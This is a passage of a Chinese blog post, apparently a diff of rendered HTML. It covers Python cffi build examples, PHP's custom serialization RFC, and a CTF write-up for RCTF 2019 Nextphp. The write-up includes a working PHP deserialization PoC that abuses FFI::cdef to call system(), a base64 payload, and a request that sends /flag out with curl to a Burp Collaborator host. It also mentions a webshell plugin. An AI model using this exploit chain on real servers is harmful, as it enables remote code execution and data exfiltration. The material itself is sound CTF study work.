+&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_source&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi_example._fnmatch&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75715e"># Since we are calling fnmatch directly no custom source is necessary. We&lt;/span>
+&lt;span style="color:#75715e"># need to #include &amp;lt;fnmatch.h&amp;gt;, though, because behind the scenes cffi&lt;/span>
+&lt;span style="color:#75715e"># generates a .c file which contains a Python-friendly wrapper around&lt;/span>
+&lt;span style="color:#75715e"># ``fnmatch``:&lt;/span>
+&lt;span style="color:#75715e"># static PyObject *&lt;/span>
+&lt;span style="color:#75715e"># _cffi_f_fnmatch(PyObject *self, PyObject *args) {&lt;/span>
+&lt;span style="color:#75715e"># ... setup ...&lt;/span>
+&lt;span style="color:#75715e"># result = fnmatch(...);&lt;/span>
+&lt;span style="color:#75715e"># return PyInt_FromLong(result);&lt;/span>
+&lt;span style="color:#75715e"># }&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;#include &amp;lt;fnmatch.h&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75715e"># The important thing is to inclue libc in the list of libraries we&amp;#39;re&lt;/span>
+&lt;span style="color:#75715e"># linking against:&lt;/span>
+&lt;span style="color:#111">libraries&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
+&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;fnmatch.h&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cdef&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">())&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
+&lt;span style="color:#111">ffi&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compile&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>一个&lt;a href="https://github.dev/wolever/python-cffi-example/blob/ec14da61ee0de770750ff3781b412a3b25f020eb/setup.py#L1-L33">setup.py&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
+&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">setuptools&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">find_packages&lt;/span>
+&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">chdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dirname&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
+&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi-example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">version&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">classifiers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;Development Status :: 4 - Beta&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 2&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: 3&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;Programming Language :: Python :: Implementation :: PyPy&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;License :: OSI Approved :: BSD License&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">],&lt;/span>
+&lt;span style="color:#111">packages&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">find_packages&lt;/span>&lt;span style="color:#111">(),&lt;/span>
+&lt;span style="color:#111">install_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
+&lt;span style="color:#111">setup_requires&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cffi&amp;gt;=1.0.0&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span>
+&lt;span style="color:#111">cffi_modules&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>
+&lt;span style="color:#d88200">&amp;#34;./build_fnmatch.py:ffi&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">],&lt;/span>
+&lt;span style="color:#111">)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后的cffi_modules指定了需要生成ffi实例的文件&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pyhon setup.py install
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190508189.png" alt="image-20211202190508189">&lt;/p>
+&lt;p>没想到是个报错，仔细看一下原因，解决方法是把之前的fnmatch.h中的偏移换成16进制&lt;/p>
+&lt;p>再次执行就好了&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202190825764.png" alt="image-20211202190825764">&lt;/p>
+&lt;p>可以看到这种方式比之前生成的文件都要多，相当于安装了一个模块&lt;/p>
+&lt;p>然后是一个test_fnmatch.py，注意这里直接用给出的文件还是会报错，把下图高亮的地方换成0x1&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202191447689.png" alt="image-20211202191447689">&lt;/p>
+&lt;p>再执行就好了&lt;/p>
+&lt;p>cffi和ctypes还有很多的花活，鉴于我的代码能力一般（c和python都是勉强够用的水平），就不班门弄斧了，更多的东西还是看官方文档比较靠谱（链接贴在最后了&lt;/p>
+&lt;p>————什么？为什么FFI in PHP介绍的还不如FFI in Python的多？&lt;/p>
+&lt;p>emmmmm 这个嘛 才不会说是因为懒呢&lt;/p>
+&lt;h2 id="serializable">Serializable&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | php7.4启用&lt;/li>
+&lt;/ul>
+&lt;p>已有的反序列化魔术方法总是有很多安全问题，这个提议新增了&lt;code>__serialize()&lt;/code>，&lt;code>__unserialize()&lt;/code>，&lt;code>serialize()&lt;/code>，&lt;code>unserialize()&lt;/code>和&lt;code>Serializable()&lt;/code>&lt;/p>
+&lt;p>&lt;code>serialize()&lt;/code>检查到&lt;code>__serialize()&lt;/code>的存在后将在序列化之前优先执行，返回序列化形式的数组，如有错抛出TypeError；如果同时有&lt;code>__serialize()&lt;/code>和&lt;code>__sleep()&lt;/code>，后者将被忽略；如果对象实现了&lt;code>Serializable()&lt;/code>接口，接口的&lt;code>serialize()&lt;/code>将被忽略，类中的&lt;code>__serialize()&lt;/code>将被调用；反序列化时触发&lt;code>__unserialize()&lt;/code>&lt;/p>
+&lt;p>————好勾八复杂的，建议直接看文档&lt;/p>
+&lt;h2 id="rctf-2019nextphp">[RCTF 2019]Nextphp&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;print_r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>
+&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__serialize&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果熟读以上三个文档，这个题就很好出了&lt;/p>
+&lt;p>我们可以把func设为&lt;code>FFI:cdef&lt;/code>，arg设为&lt;code>int system(char *command)&lt;/code>来执行c代码绕过php.ini中的限制；同时由于Serializable的种种新特性（出题人也在这里设了坑），我们在构造poc时要删除&lt;code>__serialize()&lt;/code>，防止直接return进坑里了&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;FFI::cdef&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#39;int system(char *command);&amp;#39;&lt;/span>
+&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">run&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ret&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;func&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;arg&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span> &lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#75af00">string&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">__unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">array_merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__get&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__set&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">\Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;No implemented&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;start&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>随后在传入的地方执行&lt;code>unserialize(base64_decode(payload))-&amp;gt;__serialize()['ret']-&amp;gt;system(command);&lt;/code>，直接curl外带flag&lt;/p>
+&lt;pre tabindex="0">&lt;code>?a=unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&amp;gt;__serialize()['ret']-&amp;gt;system(&amp;quot;curl -d @/flag http://fm56ifsleqz363dh864mlhvtzk5atz.burpcollaborator.net&amp;quot;);
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223140032.png" alt="image-20211202223140032">&lt;/p>
+&lt;p>————在这个题出现之后蚁剑还专门出了对应的插件&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223257130.png" alt="image-20211202223257130">&lt;/p>
+&lt;p>但是多次尝试失败，之后看到了这个&lt;a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">wp&lt;/a>之后再看&lt;a href="https://wiki.php.net/rfc/ffi">官方文档&lt;/a>还有&lt;a href="https://www.laruence.com/2020/03/11/5475.html">这一篇&lt;/a>就明白了&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211202223422195.png" alt="image-20211202223422195">&lt;/p>
+&lt;p>默认情况下FFI只会被用于CLI模式下&amp;amp;预加载php脚本，除非设置&lt;code>ffi.enable=true&lt;/code>，设置之后在webshell就可以直接用蚁剑插件了&lt;/p>
+&lt;hr>
+&lt;p>最近在刷buuoj，有望这个月内把50解以上的题做完捏&lt;/p>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;p>&lt;a href="https://wiki.php.net/rfc/preload">PHP RFC: Preloading&lt;/a> | &lt;a href="https://wiki.php.net/rfc/ffi">PHP RFC: FFI - Foreign Function Interface&lt;/a> | &lt;a href="https://wiki.php.net/rfc/custom_object_serialization">PHP RFC: New custom object serialization mechanism&lt;/a> | &lt;a href="https://www.laruence.com/2020/03/11/5475.html">PHP FFI详解 - 一种全新的PHP扩展方式&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://towardsdatascience.com/do-you-hate-how-slow-python-is-this-is-how-you-can-make-it-run-faster-532468fe1583">Do You Hate How Slow Python Is? This Is How You Can Make It Run Faster!&lt;/a> | &lt;a href="https://towardsdatascience.com/make-python-faster-with-cffi-python-bindings-eb5402bc35dd">Make Python Faster with CFFI Python Bindings&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://cffi.readthedocs.io/en/latest/">CFFI documentation&lt;/a> | &lt;a href="https://docs.python.org/3/library/ctypes.html">ctypes documentation&lt;/a>&lt;/p>
